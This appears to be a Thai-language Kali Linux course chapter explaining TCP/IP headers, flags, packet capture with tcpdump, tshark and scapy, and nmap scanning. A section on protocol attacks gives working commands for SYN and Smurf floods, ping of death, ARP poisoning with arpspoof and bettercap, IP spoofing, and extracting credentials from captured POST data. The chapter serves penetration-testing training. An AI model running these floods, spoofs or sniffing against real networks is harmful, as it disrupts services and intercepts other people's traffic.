# Part 04: TCP/IP Deep Dive - TCP/IP Protocol เชิงลึก

## สารบัญ
- [TCP 3-Way Handshake](#tcp-3-way-handshake)
- [TCP Flags](#tcp-flags)
- [TCP Header Analysis](#tcp-header-analysis)
- [IP Header](#ip-header)
- [Network Attacks at Protocol Level](#network-attacks-at-protocol-level)
- [Packet Analysis](#packet-analysis)
- [แบบฝึกหัด](#แบบฝึกหัด)

---

## TCP 3-Way Handshake

```
Client                    Server
  |                          |
  |---- SYN (SEQ=100) -----> |  Step 1: ขอเชื่อมต่อ
  |                          |
  | <-- SYN-ACK (SEQ=200,  - |  Step 2: ยืนยันและส่ง SEQ
  |      ACK=101)            |
  |                          |
  |---- ACK (ACK=201) -----> |  Step 3: ยืนยัน
  |                          |
  |=== Connection Established ===|
  |                          |
  |---- DATA --------------> |  ส่งข้อมูล
  |                          |
  |---- FIN ---------------> |  ขอปิดการเชื่อมต่อ
  | <-- FIN-ACK ----------- |
  |---- ACK ---------------> |
  |=== Connection Closed ====|
```

### ความสำคัญสำหรับ Penetration Testing

```
SYN scan (nmap -sS):
- ส่ง SYN
- รับ SYN-ACK = port OPEN
- รับ RST = port CLOSED
- ไม่ตอบ = port FILTERED
- ไม่ส่ง ACK ทำให้ไม่มี full connection (stealthy)

Connection scan (nmap -sT):
- ทำ full 3-way handshake
- จะถูก log ใน server
```

---

## TCP Flags

| Flag | ย่อ | ความหมาย | ใช้ใน |
|------|-----|----------|-------|
| SYN | S | Synchronize | เริ่มต้น connection |
| ACK | A | Acknowledge | ยืนยันรับ packet |
| FIN | F | Finish | ปิด connection |
| RST | R | Reset | รีเซ็ต connection |
| PSH | P | Push | ส่งข้อมูลทันที |
| URG | U | Urgent | ข้อมูลเร่งด่วน |

### Flag Combinations

```bash
# Wireshark filter สำหรับ flags
tcp.flags.syn == 1 && tcp.flags.ack == 0    # SYN (new connections)
tcp.flags.syn == 1 && tcp.flags.ack == 1    # SYN-ACK
tcp.flags.rst == 1                           # RST (connection reset)
tcp.flags.fin == 1                           # FIN (closing)

# Nmap scan types ใช้ flags:
nmap -sS  # SYN scan
nmap -sN  # NULL scan (no flags)
nmap -sF  # FIN scan (FIN only)
nmap -sX  # Xmas scan (FIN+PSH+URG)
```

---

## TCP Header Analysis

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Source Port          |       Destination Port        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Sequence Number                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Acknowledgment Number                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Data |           |U|A|P|R|S|F|                               |
| Offset| Reserved  |R|C|S|S|Y|I|            Window             |
|       |           |G|K|H|T|N|N|                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Checksum            |         Urgent Pointer        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

### วิเคราะห์ด้วย tcpdump

```bash
# Capture TCP traffic
sudo tcpdump -i eth0 tcp

# Capture traffic to specific host/port
sudo tcpdump -i eth0 'host 192.168.1.100 and port 80'

# แสดง packet ทั้งหมด (ASCII)
sudo tcpdump -i eth0 -A port 80

# แสดง hex
sudo tcpdump -i eth0 -X port 80

# บันทึกและอ่าน
sudo tcpdump -i eth0 -w /tmp/capture.pcap
sudo tcpdump -r /tmp/capture.pcap

# Filter SYN packets เท่านั้น
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'

# Filter HTTP traffic
sudo tcpdump -i eth0 -A 'port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
```

---

## IP Header

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version|  IHL  |Type of Service|          Total Length         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Identification        |Flags|      Fragment Offset     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Time to Live |    Protocol   |         Header Checksum       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       Source Address                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Destination Address                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

### TTL Values และ OS Fingerprinting

| OS | Default TTL | แสดงว่า |
|----|------------|----------|
| Windows | 128 | Windows system |
| Linux | 64 | Linux/Unix |
| macOS | 64 | macOS/iOS |
| Solaris | 255 | Solaris |
| FreeBSD | 64 | BSD systems |

```bash
# ดู TTL จาก ping
ping -c 1 192.168.1.1
# PING 192.168.1.1: 64 byte packets
# 64 bytes from 192.168.1.1: icmp_seq=0 ttl=128 time=1.234 ms
#                                            ^^^ Windows!

# OS detection ด้วย nmap
nmap -O 192.168.1.100
```

---

## Network Attacks at Protocol Level

### SYN Flood (DoS Attack)

```
Attacker ส่ง SYN packets จำนวนมากโดยไม่ทำ handshake ให้สมบูรณ์
ทำให้ server's connection table เต็ม

SYN ---> Server
SYN ---> Server  
...ส่งหลายพันครั้ง...

Server: เก็บ half-open connections จนหน่วยความจำเต็ม
Result: Denial of Service
```

```bash
# เครื่องมือที่ใช้ (ต้องได้รับอนุญาต!)
hping3 -S --flood -V -p 80 192.168.1.100
```

### ARP Spoofing / Poisoning

```
สถานการณ์:
Attacker (192.168.1.50, MAC: AA:AA:AA:AA:AA:AA)
Victim   (192.168.1.100, MAC: BB:BB:BB:BB:BB:BB)
Gateway  (192.168.1.1,   MAC: CC:CC:CC:CC:CC:CC)

Attacker ส่ง ARP reply ว่า:
"192.168.1.1 is at AA:AA:AA:AA:AA:AA"  -> Victim
"192.168.1.100 is at AA:AA:AA:AA:AA:AA" -> Gateway

ผลลัพธ์: traffic ผ่าน Attacker (Man-in-the-Middle)
```

```bash
# arp spoofing (ต้องได้รับอนุญาต!)
# เปิด IP forwarding ก่อน
echo 1 > /proc/sys/net/ipv4/ip_forward

# Poison victim
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Poison gateway  
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# หรือใช้ bettercap
bettercap -iface eth0
bettercap> arp.spoof on
bettercap> net.sniff on
```

### ICMP Attacks

```bash
# Ping of Death (มี size ใหญ่เกิน)
hping3 -1 --data 65000 192.168.1.100

# Smurf Attack (broadcast amplification)
hping3 -1 --spoof victim_ip --flood 192.168.1.255

# ICMP redirect
hping3 --icmp-type 5 192.168.1.100
```

### IP Spoofing

```bash
# ปลอม source IP
hping3 -a 1.2.3.4 -S -p 80 192.168.1.100

# สร้าง custom packet ด้วย scapy
python3 << 'EOF'
from scapy.all import *

# สร้าง IP packet
ip = IP(src="1.2.3.4", dst="192.168.1.100")
tcp = TCP(sport=1234, dport=80, flags="S")
packet = ip/tcp

# ส่ง
send(packet)
print("Packet sent!")
EOF
```

---

## Packet Analysis

### Capture และวิเคราะห์

```bash
# Capture HTTP traffic
sudo tcpdump -i eth0 -w http_capture.pcap 'port 80'

# วิเคราะห์ด้วย tshark
tshark -r http_capture.pcap -Y 'http.request'
tshark -r http_capture.pcap -Y 'http.request' -T fields -e http.request.method -e http.request.uri

# Export HTTP objects (ดาวน์โหลดไฟล์จาก pcap)
tshark -r capture.pcap --export-objects http,/tmp/extracted/

# ค้นหา credentials
tshark -r capture.pcap -Y 'http.request.method == "POST"' -T fields -e http.file_data

# หา DNS queries
tshark -r capture.pcap -Y 'dns.qry.type == 1' -T fields -e dns.qry.name
```

### scapy - Python Packet Library

```python
#!/usr/bin/env python3
from scapy.all import *

# Ping sweep
def ping_sweep(network):
    ans, unans = sr(IP(dst=network)/ICMP(), timeout=1, verbose=0)
    for sent, received in ans:
        print(f"[+] {received.src} is alive")

ping_sweep("192.168.1.0/24")

# Port scan
def tcp_scan(host, ports):
    for port in ports:
        pkt = sr1(IP(dst=host)/TCP(dport=port, flags="S"), timeout=1, verbose=0)
        if pkt and pkt.haslayer(TCP):
            if pkt[TCP].flags == 0x12:  # SYN-ACK
                print(f"[+] Port {port}: OPEN")
                sr(IP(dst=host)/TCP(dport=port, flags="R"), timeout=1, verbose=0)
            elif pkt[TCP].flags == 0x14:  # RST
                print(f"[-] Port {port}: CLOSED")
        else:
            print(f"[?] Port {port}: FILTERED")

tcp_scan("192.168.1.100", [22, 80, 443, 3389])

# ARP scan
def arp_scan(network):
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=2, verbose=0)[0]
    
    for sent, received in result:
        print(f"IP: {received.psrc}\tMAC: {received.hwsrc}")

arp_scan("192.168.1.0/24")
```

---

## UDP Protocol

```
UDP Header:
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Source Port          |       Destination Port        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|             Length            |            Checksum           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                             Data                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

### UDP Services ที่สำคัญ

```bash
# DNS (port 53)
dig @8.8.8.8 google.com

# SNMP (port 161)
snmpwalk -v2c -c public 192.168.1.100

# TFTP (port 69)
tftp 192.168.1.100

# UDP scan
nmap -sU -p 53,67,68,69,123,161,500 192.168.1.100
```

---

## แบบฝึกหัด

### แบบฝึกหัดที่ 1: Packet Analysis

```bash
# 1. Capture traffic บน interface eth0
sudo tcpdump -i eth0 -c 200 -w /tmp/test.pcap

# 2. วิเคราะห์
tshark -r /tmp/test.pcap | head -50

# 3. หา protocols ที่มี
tshark -r /tmp/test.pcap -T fields -e frame.protocols | sort | uniq -c | sort -rn | head

# 4. หา IP ที่คุยกันมากที่สุด
tshark -r /tmp/test.pcap -T fields -e ip.src -e ip.dst | sort | uniq -c | sort -rn | head
```

### แบบฝึกหัดที่ 2: Scapy Basics

```python
#!/usr/bin/env python3
from scapy.all import *

# ส่ง ICMP ping
pkt = IP(dst="8.8.8.8")/ICMP()
reply = sr1(pkt, timeout=2, verbose=0)
if reply:
    print(f"Reply from {reply.src}, TTL={reply.ttl}")

# ส่ง TCP SYN
pkt = IP(dst="192.168.1.1")/TCP(dport=80, flags="S")
reply = sr1(pkt, timeout=2, verbose=0)
if reply and reply.haslayer(TCP):
    if reply[TCP].flags == 0x12:
        print("Port 80: OPEN")
```

---

## สรุป

| หัวข้อ | สิ่งที่เรียนรู้ |
|--------|----------------|
| TCP Handshake | 3-way: SYN, SYN-ACK, ACK |
| TCP Flags | SYN, ACK, FIN, RST, PSH, URG |
| IP Header | TTL สำหรับ OS fingerprinting |
| Attacks | SYN flood, ARP spoofing, IP spoofing |
| Tools | tcpdump, wireshark, scapy, hping3 |

**Part ถัดไป:** [Part 05: DNS, DHCP, HTTP Protocols](Part-05-DNS-DHCP-HTTP-Protocols.md)

---
*Part 04/100 | Kali Linux Course*
